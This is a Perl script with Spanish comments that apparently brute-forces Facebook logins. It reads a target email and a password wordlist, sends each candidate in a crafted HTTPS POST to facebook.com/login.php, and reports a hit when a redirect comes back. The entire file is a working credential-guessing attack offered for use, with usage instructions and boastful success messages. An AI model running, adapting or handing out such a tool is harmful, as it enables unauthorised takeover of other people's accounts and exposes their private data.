#!/usr/bin/perl
#

# CUANDO VEAZ UN # NO APARECERA EN LA EJECUCION SOLO CON COMENTARIOS MIOS OMAR JONAX9872


use strict;
use Net::SSLeay::Handle;
#
#
#
#SI VAS A AGREGAR MAS PALABRAS LAS QUE QUIERAS SOLO AGREGA AQUI ABAJO DESPUES DE [4], PON ( && $ARGV[5]) ETC. OMAR JONAX9872
if(!defined($ARGV[0] && $ARGV[1] && $ARGV[2] && $ARGV[3] && $ARGV[4] && $ARGV[5])) {
#OJO DESPUES DE QUE AGREGUES MAS PALABRAS DEBERAS MODIFICAR MAS ABAJO DONDE APARECE OTRA VEZ LOS #
#
#
system('cls');
system('clear');
print "\n\n\n\n";
print " *ECHO POR (BASE) [[Z hacker]], MEJORADO Y TRADUCIDO POR Omar jonax9872*\n\n";
print "                               Version 2.32 \n\n";
print "033[1;   md888    d8b.  .o88b.  d88888b  .8888.  d8  8b. .dbdD88 d88888b \n";
print "88'     d8' `8b d8P  Y8 88'     88  `8D .8P  Y8. 88 ,8P' 88'     88  `8D \n";
print "88ooo   88ooo88 8P      88ooooo 88oooY' 88    88 88,8P   88ooooo 88oobY' \n";
print "88~~~   88~~~88 8b      88~~~~~ 88~~~b. 88    88 88`8b   88~~~~~ 88`8b   \n";
print "88      88   88 Y8b  d8 88.     88   8D `8b  d8' 88 `88. 88.     88 `88. \n";
print "YP      YP   YP  `Y88P' Y88888P Y8888P'  `Y88P'  YP   YD Y88888P 88   YD \n";

print " \n\n          ======================================================\n";
print "   Sintaxis:perl $0 Email diccionario.txt palabra1 palabra2 palabra3 palabra4\n\n";
print "          ======================================================\n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
print "\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];
#
#
#
#EN ESTA PARTE PUEDES MODIFICAR SI DESEAS AGREGAR MAS PALABRAS 
my $primera = $ARGV[2];
my $segunda = $ARGV[3];
my $tercera = $ARGV[4];
my $cuarta = $ARGV[5];
open(MIFICH,">>/home/psycho/pass/zaoitt2/1.txt")|| die "lo siento, no puedo crear fichero.txt\n";   
print MIFICH "\n$primera\n$segunda\n$tercera\n$cuarta";
close(MIFICH);
#
#
#
#

open (LIST, $wordlist) || die "\n[-] Onta el chingado diccionario we ($wordlist) <-- Este no es \n";

system('cls');
system('clear');
print "\n\n                                 Version 2.32 \n\n\n";
print "033[1;   32md8   .8888. 88d88b.  .o88b.   d888.  d8  8b.  .d88b. dbdDd8. \n";
print "88'     d8' `8b d8P  Y8 88'     88  `8D .8P  Y8. 88 ,8P' 88'     88  `8D \n";
print "88ooo   88ooo88 8P      88ooooo 88oooY' 88    88 88,8P   88ooooo 88oobY' \n";
print "88~~~   88~~~88 8b      88~~~~~ 88~~~b. 88    88 88`8b   88~~~~~ 88`8b   \n";
print "88      88   88 Y8b  d8 88.     88   8D `8b  d8' 88 `88. 88.     88 `88. \n";
print "YP      YP   YP  `Y88P' Y88888P Y8888P'  `Y88P'  YP   YD Y88888P 88   YD \n\n";

print "         =======================================================\n";
print "     ECHO POR (BASE) [[Z hacker]] MEJORADO Y TRADUCIDO POR Omar jonax9872   \n";
print "         ========================================================\n";

print "\n [+] Crackeo iniciado alvc :v --> $user ...\n\n";
print "=======================================\n";


while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "[-] $password -> Esta no es :/ \n";
close SSL;
}
else
{
print "\n***************************************************************\n";
print " [+]Chingaste pass :v    $password  [+][+]\n";
print "**********************FUCK YEA*********************************\n\n";
close SSL;
exit;
}
}
